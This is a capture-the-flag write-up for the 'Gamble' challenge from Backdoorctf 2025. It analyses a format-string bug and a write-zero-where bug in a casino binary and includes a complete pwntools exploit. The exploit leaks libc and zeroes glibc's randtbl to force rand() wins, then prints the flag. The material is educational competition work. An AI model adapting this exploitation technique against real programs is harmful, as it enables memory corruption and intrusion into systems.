---
title: Backdoorctf 2025 | Gamble
published: 2025-12-18
description: My friends and I planned a trip to Gokarna and heard about a famous casino with a machine that almost never lets anyone win, only the truly lucky. I’ve replicated it. Let’s see if you are one of them!
image: ''
tags: ["rev"]
authors: ["ebreo"]
solves: 44
points: 100
firstblood: false
category: Backdoorctf2025
draft: false

---

# Introduction

We are given an executable and some docker files.

![ls -al](/images/gamble/command.png)

Let's open the executable in ghidra.

![main](/images/gamble/main.png)

The program initializes srand with seed **time(0)**. We can login, place a bet, and finally gamble. In gamble, we get five chances to have rand() return a small enough number. In such case, the win function is called which prints the flag.

Analyzing the program, there are two vulnerabilities:
1. A logic error in the loop of **bet()** allows to overflow **buf** to reach **local_98** and achieve a format string vulnerability with the printf

![bet](/images/bet.png)
2. In **gamble()** after losing, instead of setting the user money to 0, money is treated as a pointer and 8 bytes at the pointed location are set to 0. This achieves a **write 0 where** vulnerability.
![gamble](/images/gamble/gamble.png)
The user money is a variable whose size happens to be 8 bytes, and we can set it during the login.

![login](/images/gamble/login.png)

Based on these vulnerabilities, we can obtain a libc leak using the format string and overwrite libc **randtbl** entries with 0. Since glibc’s **rand()** is a stateful PRNG that updates and mixes values stored in randtbl, forcing the table entries to zero collapses the internal state causing the generated values to be zero with higher probability.This technique was inspired by this [**writeup**](https://lkmidas.github.io/posts/20200319-angstromctf2020-writeups/), which also explains glibc **rand()** internals in more detail for interested readers.

Installing gdb on the Docker we can look at the stack layout when the format string is triggered, finding that "$33%p" leaks **__libc_start_main+122**, and that **randtbl** resides at __libc_start_main + 0x1d8ed0.

Steps of the exploit:
- login with user id 0
- place bet to leak libc
- calculate randtbl address
- for **i** in range(1,9):
    - login with user id **i**, give **randbtl + i\*8** as money amount
    - place bet
    - gamble
        - If lucky, flag is printed
        - Otherwise, **randbtl + i\*8** is set to 0 

Exploit:
```python
from pwn import *
from tqdm import trange

host = 'remote.infoseciitr.in'
port = 8004

elf = ELF("./chal")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.WARN

gdbscript = '''
set follow-fork-mode parent
# fmtstr vuln
#break *bet+0x21e

break *rand

#break *gamble+0x138
break *gamble+0x15c
continue
'''

#args.GDB = True
def connection():
    if args.LOCAL:
        c = process([elf.path])
    elif args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = remote(host, port)
    return c

stuff_to_leak = [(33,"__libc_start_call_main", 122), (23, "_rtld_global", 0), (19, "_IO_2_1_stdin_", 0)]
stuff_to_leak = [(33,"__libc_start_call_main", 122)] #only need one if we don't trust libc db :)

assert(len(stuff_to_leak) < 10)

def main():

    c = connection()
    user_idx = -1
    leaks_list = {}
    for index, name , offset in stuff_to_leak:
        
        user_idx += 1
        # login 
        c.sendlineafter(b'> ', b'1')
        c.sendlineafter(b'(0-9): ', f"{user_idx}".encode())
        c.sendlineafter(b'name: ', f'name{user_idx}'.encode())
        c.sendlineafter(b'want: ', b'0')

        # leak libc
        payload = b'Z' * 10 + f'%{index}$p#'.encode()
        payload += b' '*(16 - len(payload))
        assert len(payload) == 16

        c.sendlineafter(b'> ', b'2')
        c.sendlineafter(b'bet: ', f'{user_idx}'.encode())
        c.sendafter(b'Currency): ', payload)
        cur_leak = int(c.recvuntil(b'#', drop=True).decode(),16)
        print(index, hex(cur_leak), name)
        leaks_list[name] = cur_leak - offset
        #c.interactive()

    print(leaks_list)

    #libc_path = libcdb.search_by_symbol_offsets(symbols=leaks_list)
    #libc = ELF(libc_path)
    #print(hex(libc.symbols.randtbl))
    #libc.address = int(leaks_list["__libc_start_call_main"],16) - libc.symbols.__libc_start_call_main
    #libc.save('./libc.so')

    #randtbl = int(leaks_list["__libc_start_call_main"],16) + 0x1d8ed0
    randtbl = leaks_list["__libc_start_call_main"] + 0x1d8ed0

    print("randtbl = ", hex(randtbl))

    randtbl_idx = -1
    for i in trange(10-user_idx):
        user_idx+=1
        randtbl_idx += 1

        # login 1
        c.sendlineafter(b'> ', b'1')
        c.sendlineafter(b'(0-9): ', f'{user_idx}'.encode())
        c.sendlineafter(b'name: ', b'baitdecuchis')
        #c.sendlineafter(b'want: ', str((libc.symbols.unsafe_state + context.bytes * 3) // context.bytes).encode())
        c.sendlineafter(b'want: ', str((randtbl + 8*randtbl_idx) >> 3).encode()) #need to divide by 8

        #bet
        c.sendlineafter(b'> ', b'2')
        c.sendlineafter(b'bet: ', f'{user_idx}'.encode())
        c.sendlineafter(b'Currency): ', b'a')

        # gamble
        c.sendlineafter(b'> ', b'3')
        c.sendlineafter(b'gamble: ', f'{user_idx}'.encode())
        c.recvuntil(b"Press ENTER to gamble...")

        for _ in range(5):
            c.sendline(b'')

            rcvd = c.recvlines(2)
            if b"Congratulations! You guessed it right!" in rcvd:
                print("got lucky")
                c.interactive()
                exit()      
    
    print("got unlucky")

if __name__ == '__main__':
    main()
```

The loop at the beginning initially leaked multiple libc values in order to use pwntools **libcdb.search_by_symbol_offsets** to have the offsets calculated automatically. This did not work and we ended up doing the math with hardcoded offsets like the good old times :thumbsup:.

Exploit skeleton provided by Antonio aka [simplesso](https://github.com/s1mpl3ss0).

flag: `flag{r4nd_1s_n0t_truly_r4nd0m_l0l!_57}`
